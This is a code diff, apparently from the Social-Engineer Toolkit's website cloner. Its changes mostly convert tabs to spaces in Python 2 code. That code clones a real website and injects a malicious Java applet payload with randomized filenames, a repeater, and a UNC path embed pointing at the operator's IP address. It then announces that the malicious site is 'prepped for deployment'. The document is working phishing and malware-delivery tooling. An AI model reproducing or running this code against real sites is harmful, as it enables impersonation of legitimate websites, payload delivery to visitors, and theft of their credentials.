@@ -10,7 +10,7 @@ import sys
 import time
 import re
 import shutil
-import urllib2 
+import urllib2
 
 operating_system = check_os()
 definepath=os.getcwd()
@@ -28,10 +28,10 @@ track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()
 
 ## Open the IPADDR file
 if check_options("IPADDR=") != 0:
-	ipaddr = check_options("IPADDR=")
+    ipaddr = check_options("IPADDR=")
 else:
-	ipaddr = raw_input("Enter your IP address: ")
-	update_options("IPADDR=" + ipaddr)
+    ipaddr = raw_input("Enter your IP address: ")
+    update_options("IPADDR=" + ipaddr)
 
 ## Define base value
 site_cloned = True
@@ -41,7 +41,7 @@ meterpreter_iframe="8080"
 
 ## make dir if needed
 if not os.path.isdir("src/program_junk/web_clone/"):
-        os.makedirs("src/program_junk/web_clone")
+    os.makedirs("src/program_junk/web_clone")
 
 ## if we used a proxy configuration from the set-proxy
 if os.path.isfile("src/program_junk/proxy.confg"):
@@ -120,41 +120,41 @@ try:
         ## clean up old stuff
         ## set counter
         counter=0
-	# try except block in case no internet connection, route to Internet, etc.
-	try:
-		# check if we have wget, if we don't then use urllib2
-		wget = 0
-		if os.path.isfile("/usr/local/bin/wget"):
-			wget = 1
-		if os.path.isfile("/usr/bin/wget"):
-			wget = 1
-		if os.path.isfile("/usr/local/wget"):
-			wget = 1
+        # try except block in case no internet connection, route to Internet, etc.
+        try:
+                # check if we have wget, if we don't then use urllib2
+            wget = 0
+            if os.path.isfile("/usr/local/bin/wget"):
+                wget = 1
+            if os.path.isfile("/usr/bin/wget"):
+                wget = 1
+            if os.path.isfile("/usr/local/wget"):
+                wget = 1
 
-		if wget == 1:
-			subprocess.Popen('%s;cd src/program_junk/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" %s;' % (proxy_config,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+            if wget == 1:
+                subprocess.Popen('%s;cd src/program_junk/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" %s;' % (proxy_config,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
-		if wget == 0:
-			# if we don't have wget installed we will use python to rip, not as good as wget
-			headers = { 'User-Agent' : user_agent }
-			# read in the websites 
-			req = urllib2.Request(url, None, headers)
-			# read in the data from the initial request
-			html = urllib2.urlopen(req).read()
-			# if length isnt much then we didnt get the site cloned
-			if len(html) > 1:
-				# if the site has cloned properly
-	        		site_cloned = True
-				# open file for writing
-				filewrite = file("src/program_junk/web_clone/index.html", "w")
-				# write the data back from the request
-				filewrite.write(html)
-				# close the file
-				filewrite.close()
+            if wget == 0:
+                # if we don't have wget installed we will use python to rip, not as good as wget
+                headers = { 'User-Agent' : user_agent }
+                # read in the websites
+                req = urllib2.Request(url, None, headers)
+                # read in the data from the initial request
+                html = urllib2.urlopen(req).read()
+                # if length isnt much then we didnt get the site cloned
+                if len(html) > 1:
+                    # if the site has cloned properly
+                    site_cloned = True
+                    # open file for writing
+                    filewrite = file("src/program_junk/web_clone/index.html", "w")
+                    # write the data back from the request
+                    filewrite.write(html)
+                    # close the file
+                    filewrite.close()
 
-	# if it failed ;(
-	except:
-		pass
+        # if it failed ;(
+        except:
+            pass
 
         ## If the website did not clone properly, exit out.
         if not os.path.isfile("src/program_junk/web_clone/index.html"):
@@ -166,21 +166,21 @@ try:
             filewrite.write("failed")
             filewrite.close()
 
-	if os.path.isfile("src/program_junk/web_clone/index.html"):
-		fileopen = file("src/program_junk/web_clone/index.html", "r")
-		counter = 0
-		for line in fileopen:
-			counter = counter + 1
-		if counter == 1 or counter == 0:
-			print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
-			return_continue()
-			site_cloned = False
-			os.remove("src/program_junk/web_clone/index.html")
+        if os.path.isfile("src/program_junk/web_clone/index.html"):
+            fileopen = file("src/program_junk/web_clone/index.html", "r")
+            counter = 0
+            for line in fileopen:
+                counter = counter + 1
+            if counter == 1 or counter == 0:
+                print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
+                return_continue()
+                site_cloned = False
+                os.remove("src/program_junk/web_clone/index.html")
 
-	                ## add file to let set interactive shell know it was unsuccessful
-        	        filewrite=file("src/program_junk/cloner.failed" , "w")
-            		filewrite.write("failed")
-            		filewrite.close()
+                ## add file to let set interactive shell know it was unsuccessful
+                filewrite=file("src/program_junk/cloner.failed" , "w")
+                filewrite.write("failed")
+                filewrite.close()
 
         if site_cloned == True:
 
@@ -190,25 +190,25 @@ try:
 
     if site_cloned == True:
 
-	# if we specify UNC embedding
-	if unc_embed == True:
-	        fileopen=file("src/program_junk/web_clone/index.html","r")
-		index_database = fileopen.read()
-		filewrite = file("src/program_junk/web_clone/index.html", "w")
-	
-	        ## Open the UNC EMBED
-	        fileopen4=file("src/webattack/web_clone/unc.database", "r")
-		unc_database = fileopen4.read()
-        	unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
-                unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
-        	match = re.search("</body.*?>", index_database)
-                if match:
-                	index_database = re.sub("</body.*?>", unc_database + "\n</body>", index_database)
-                if not match:
-                	index_database = re.sub("<head.*?>", "\n<head>" + unc_database, index_database)
+        # if we specify UNC embedding
+        if unc_embed == True:
+            fileopen=file("src/program_junk/web_clone/index.html","r")
+            index_database = fileopen.read()
+            filewrite = file("src/program_junk/web_clone/index.html", "w")
 
-		filewrite.write(index_database)
-		filewrite.close()
+            ## Open the UNC EMBED
+            fileopen4=file("src/webattack/web_clone/unc.database", "r")
+            unc_database = fileopen4.read()
+            unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
+            unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
+            match = re.search("</body.*?>", index_database)
+            if match:
+                index_database = re.sub("</body.*?>", unc_database + "\n</body>", index_database)
+            if not match:
+                index_database = re.sub("<head.*?>", "\n<head>" + unc_database, index_database)
+
+            filewrite.write(index_database)
+            filewrite.close()
 
         ## java applet attack vector
 
@@ -218,105 +218,105 @@ try:
             multi_java=True
 
         if attack_vector == "java" or multi_java:
-                ## Here we parse through the new website and add our java applet code, its a hack for now
-                ## Wrote this on the plane to Russia, easiest way to do this without internet access :P
-                print bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC
-                ## Read in newly created index.html
-                time.sleep(2)
-                if not os.path.isfile("src/program_junk/web_clone/index.html"):
-                        ## trigger error that we were unable to grab the website :(
-                        print_error("Unable to clone the website it appears. Email us to fix.")
-                        sys.exit()
+            ## Here we parse through the new website and add our java applet code, its a hack for now
+            ## Wrote this on the plane to Russia, easiest way to do this without internet access :P
+            print bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC
+            ## Read in newly created index.html
+            time.sleep(2)
+            if not os.path.isfile("src/program_junk/web_clone/index.html"):
+                ## trigger error that we were unable to grab the website :(
+                print_error("Unable to clone the website it appears. Email us to fix.")
+                sys.exit()
 
-                fileopen=file("src/program_junk/web_clone/index.html","r")
-                ## Read add-on for java applet
-                fileopen2=file("src/webattack/web_clone/applet.database" , "r")
-                ## Write to new file with java applet added
-                filewrite=file("src/program_junk/web_clone/index.html.new", "w")
-                fileopen3=file("src/webattack/web_clone/repeater.database", "r")
+            fileopen=file("src/program_junk/web_clone/index.html","r")
+            ## Read add-on for java applet
+            fileopen2=file("src/webattack/web_clone/applet.database" , "r")
+            ## Write to new file with java applet added
+            filewrite=file("src/program_junk/web_clone/index.html.new", "w")
+            fileopen3=file("src/webattack/web_clone/repeater.database", "r")
 
-                ## this is our cloned website 
-                index_database = fileopen.read()
-                ## this is our applet database
-                applet_database = fileopen2.read()
-                ## this is our repeater database
-                repeater_database = fileopen3.read()
+            ## this is our cloned website
+            index_database = fileopen.read()
+            ## this is our applet database
+            applet_database = fileopen2.read()
+            ## this is our repeater database
+            repeater_database = fileopen3.read()
 
-                ## here we begin replacing specifics in order to prep java applet payload
-                applet_database = applet_database.replace("msf.exe", rand_gen_win)
-		applet_database = applet_database.replace("mac.bin", rand_gen_mac)
-		applet_database = applet_database.replace("nix.bin", rand_gen_nix)
-		update_options("MSF.EXE=%s\nMAC.BIN=%s\nNIX.BIN=%s" % (rand_gen_win, rand_gen_mac, rand_gen_nix))
+            ## here we begin replacing specifics in order to prep java applet payload
+            applet_database = applet_database.replace("msf.exe", rand_gen_win)
+            applet_database = applet_database.replace("mac.bin", rand_gen_mac)
+            applet_database = applet_database.replace("nix.bin", rand_gen_nix)
+            update_options("MSF.EXE=%s\nMAC.BIN=%s\nNIX.BIN=%s" % (rand_gen_win, rand_gen_mac, rand_gen_nix))
 
-                ## close the file up
-                applet_database = applet_database.replace("ipaddrhere", ipaddr + ":" + str(web_port))
+            ## close the file up
+            applet_database = applet_database.replace("ipaddrhere", ipaddr + ":" + str(web_port))
 
-                ## set the java field 
-                applet_database = applet_database.replace("IDREPLACEHERE", java_id)
+            ## set the java field
+            applet_database = applet_database.replace("IDREPLACEHERE", java_id)
 
-                ## set up everything for the unc path
-                if unc_embed == True:
-                        unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
-                        unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
+            ## set up everything for the unc path
+            if unc_embed == True:
+                unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
+                unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
 
-                ## set up the java repeater
-                if java_repeater == True:
-                        repeater_database = repeater_database.replace("IDREPLACEHERE", java_id)
-                        repeater_database = repeater_database.replace("TIMEHEREPLZ", java_time)
-                        repeater_database = repeater_database.replace("URLHEREPLZ", url)
+            ## set up the java repeater
+            if java_repeater == True:
+                repeater_database = repeater_database.replace("IDREPLACEHERE", java_id)
+                repeater_database = repeater_database.replace("TIMEHEREPLZ", java_time)
+                repeater_database = repeater_database.replace("URLHEREPLZ", url)
 
 
-                ## do a quick sanity check and make sure body is standard
-                index_database = re.sub("</BODY.*?>", "</body>", index_database)
-                index_database = re.sub("<HEAD.*?>", "<head>", index_database)
-		index_database = re.sub("<BODY.*?>", "<body>", index_database)
+            ## do a quick sanity check and make sure body is standard
+            index_database = re.sub("</BODY.*?>", "</body>", index_database)
+            index_database = re.sub("<HEAD.*?>", "<head>", index_database)
+            index_database = re.sub("<BODY.*?>", "<body>", index_database)
 
-                ## start appending and prepping the index file
-                if java_repeater == True:
-                        match = re.search("</body.*?>", index_database)
-                        if match:
-                                index_database = re.sub("<applet ", repeater_database + "\n<applet ", index_database)
-                        if not match:
-                                index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)
-
-                counter = 0
-                ## confirm we can find body
+            ## start appending and prepping the index file
+            if java_repeater == True:
                 match = re.search("</body.*?>", index_database)
                 if match:
-                        counter = 1
-                        index_database = re.sub("</body.*?>", applet_database + "\n</body>", index_database)
-			if auto_redirect == True:
-                                index_database = index_database.replace('<param name="9" value=""', '<param name="9" value="%s"' % (url))
+                    index_database = re.sub("<applet ", repeater_database + "\n<applet ", index_database)
                 if not match:
-                        match = re.search("<head.*?>", index_database)
-                        if match:
-                                counter = 1
-                                index_database = re.sub("<head.*?>", "\n<head>" + applet_database, index_database)
-				if auto_redirect == True:
-                                        index_database = index_database.replace('<param name="9" value=""', '<param name="9" value="%s"' % (url))
+                    index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)
 
-                ## start appending and prepping the index file
-                if java_repeater == True:
-                        match = re.search("</body.*?>", index_database)
-                        if match:
-                                index_database = re.sub("<applet", repeater_database + "\n<applet ", index_database)
-                        if not match:
-                                index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)
+            counter = 0
+            ## confirm we can find body
+            match = re.search("</body.*?>", index_database)
+            if match:
+                counter = 1
+                index_database = re.sub("</body.*?>", applet_database + "\n</body>", index_database)
+                if auto_redirect == True:
+                    index_database = index_database.replace('<param name="9" value=""', '<param name="9" value="%s"' % (url))
+            if not match:
+                match = re.search("<head.*?>", index_database)
+                if match:
+                    counter = 1
+                    index_database = re.sub("<head.*?>", "\n<head>" + applet_database, index_database)
+                    if auto_redirect == True:
+                        index_database = index_database.replace('<param name="9" value=""', '<param name="9" value="%s"' % (url))
+
+            ## start appending and prepping the index file
+            if java_repeater == True:
+                match = re.search("</body.*?>", index_database)
+                if match:
+                    index_database = re.sub("<applet", repeater_database + "\n<applet ", index_database)
+                if not match:
+                    index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)
 
 
-                        if counter == 0:
-                                print_error("Unable to clone the website...Sorry.")
-                                print_error("This is usally caused by a missing body tag on a website.")
-                                print_error("Try a diferent site and attempt it again.")                
-                                sys.exit(1)               
+                if counter == 0:
+                    print_error("Unable to clone the website...Sorry.")
+                    print_error("This is usally caused by a missing body tag on a website.")
+                    print_error("Try a diferent site and attempt it again.")
+                    sys.exit(1)
 
-                ## write the file out
-                filewrite.write(index_database)
+            ## write the file out
+            filewrite.write(index_database)
 
-                ## close the file after done writing
-                filewrite.close()
+            ## close the file after done writing
+            filewrite.close()
 
-                print bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC
+            print bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC
 
         ## selection of browser exploits
         ## check to see if multiattack is in use
@@ -329,12 +329,12 @@ try:
             ## Read in newly created index.html
             if attack_vector == "multiattack":
                 if os.path.isfile("src/program_junk/web_clone/index.html"): os.remove("src/program_junk/web_clone/index.html")
-		# check to see if the file is there first
-		if not os.path.isfile("src/program_junk/web_clone/index.html.new"):
-			if os.path.isfile("src/program_junk/web_clone/index.html.bak"):
-				shutil.copyfile("src/program_junk/web_clone/index.html.bak", "src/program_junk/web_clone/index.html.new")
-		if os.path.isfile("src/program_junk/web_clone/index.html.new"):
-	                shutil.copyfile("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/index.html")
+                # check to see if the file is there first
+                if not os.path.isfile("src/program_junk/web_clone/index.html.new"):
+                    if os.path.isfile("src/program_junk/web_clone/index.html.bak"):
+                        shutil.copyfile("src/program_junk/web_clone/index.html.bak", "src/program_junk/web_clone/index.html.new")
+                if os.path.isfile("src/program_junk/web_clone/index.html.new"):
+                    shutil.copyfile("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/index.html")
                 time.sleep(1)
             fileopen=file("src/program_junk/web_clone/index.html","r").readlines()
             filewrite=file("src/program_junk/web_clone/index.html.new", "w")
